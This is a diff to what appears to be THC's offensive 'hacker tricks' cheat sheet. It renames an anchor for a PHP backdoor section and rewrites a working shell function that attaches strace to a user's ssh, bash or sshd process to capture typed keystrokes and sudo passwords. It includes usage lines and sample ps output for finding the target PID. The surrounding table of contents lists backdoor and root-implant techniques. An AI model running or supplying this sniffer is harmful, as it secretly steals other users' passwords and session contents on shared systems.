@@ -73,7 +73,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Background reverse shell](#backdoor-background-reverse-shell)
    1. [authorized_keys](#backdoor-auth-keys)
    1. [Remote access an entire network](#backdoor-network)
-   1. [Smallest PHP backdoor](#carriage-return-backdoor) 
+   1. [Smallest PHP backdoor](#php-backdoor) 
    1. [Local Root backdoor](#ld-backdoor)
    1. [Self-extracting implant](#implant)
 1. [Host Recon](#hostrecon)
@@ -1628,7 +1628,7 @@ Other methods:
 * [Gost/Cloudflared](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service) - our very own article
 * [Reverse Wireguard](https://thc.org/segfault/wireguard) - from segfault.net to any (internal) network.
 
-<a id="carriage-return-backdoor"></a>
+<a id="php-backdoor"></a>
 **6.iv. Smallest PHP Backdoor**
 
 Add this line to the beginning of any PHP file:
@@ -2090,26 +2090,27 @@ Check out our very own [eBPF tools to sniff sudo/su/ssh passwords](https://githu
 **10.iv Sniff a user's outgoing SSH session or bash with strace**
 ```sh
 tit() {
-	strace -e trace="${2:-read}" -p "${1:?}" 2>&1 | stdbuf -oL grep "^${2:-read}"'.*= [1-9]$' | awk 'BEGIN{FS="\"";}{if ($2=="\\r"){print ""}else{printf $2}}'
+	strace -e trace="${1:?}" -p "${2:?}" 2>&1 | stdbuf -oL grep "^${1}"'.*= [1-9]$' | awk 'BEGIN{FS="\"";}{if ($2=="\\r"){print ""}else{printf $2}}'
 }
-# tit $(pidof -s ssh)
-# tit $(pidof -s bash)
+# tit read $(pidof -s ssh)
+# tit read $(pidof -s bash)
 ```
-It is also possible to sniff the SSHD process and capture sudo passwords. Note that we have to trace the `write()` call instead (because sshd 'writes' data to the bash):
+It is also possible to sniff the SSHD process (captures also sudo passwords etc). Note that we trace the `write()` call instead (because sshd 'writes' data to the bash):
 ```sh
 # Find the sshd PID that spawned the bash:
-ps -eF f | grep -A1 'sshd.*pts'
+ps -eF | grep -E '(^UID|sshd.*pts)' | grep -v ' grep'
 ...
-paralle+    7309    7303  0  5088  6652   0 16:20 ?        S      0:04  |   \_ sshd: parallels@pts/1
-paralle+    7310    7309  0  2027  4608   0 16:20 pts/1    Ss+    0:00  |       \_ -bash
+UID          PID    PPID  C    SZ   RSS PSR STIME TTY          TIME CMD
+paralle+    7770    7764  0  5088  6780   1 Aug28 ?        00:00:05 sshd: parallels@pts/0
+paralle+    9056    9050  0  5088  6652   1 Aug28 ?        00:00:00 sshd: parallels@pts/1
+paralle+   11938   11932  0  5074  6772   1 10:59 ?        00:00:00 sshd: parallels@pts/3
 ...
 ```
 
-Sniff it:
+Sniff 7770 (example):
 ```shell
-tit 7309 write
+tit write 7770
 ```
-
 
 <a id="ssh-sniffing-wrapper"></a>
 **10.v. Sniff a user's outgoing SSH session with a wrapper script**
